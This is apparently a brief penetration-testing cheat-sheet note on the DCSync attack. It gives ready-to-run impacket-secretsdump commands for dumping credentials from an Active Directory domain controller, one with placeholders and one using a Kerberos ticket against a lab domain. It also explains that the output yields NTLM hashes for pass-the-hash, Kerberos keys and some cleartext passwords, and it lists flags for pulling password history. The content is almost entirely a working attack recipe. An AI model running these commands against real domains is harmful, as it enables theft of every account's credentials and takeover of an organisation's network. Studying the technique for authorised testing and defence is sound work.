---
tags:
  - linux
  - dcsync
  - sid-abuse
---
```shell-session
$ impacket-secretsdump -outputfile <OUTPUT> -just-dc <DOMAIN>/<USER>@<DC-IP>
```
>The `<USER>` should have `DS-Replication-Get-Changes-All` permission assigned

This generates three files:
1. File with NTLM hashes (decode or relay in #PtH attacks)
2. File with Kerberos Keys
3. Cleartext passwords from the NTDS if any account is set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.

- If `KRB5CCNAME` is loaded with `.ccache`:
```shell-session
$ impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
We could have simple used `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the `.ccache` file
# Useful Flags
- `-just-dc`: extracts NTLM hashes and Kerberos keys from the NTDS file
- `-just-dc-user`: to only extract data for a specific user
- `-pwd-last-set`: check last password change date
- `-history`: dump password history
- `-user-status`: to check whether a user is disabled or not
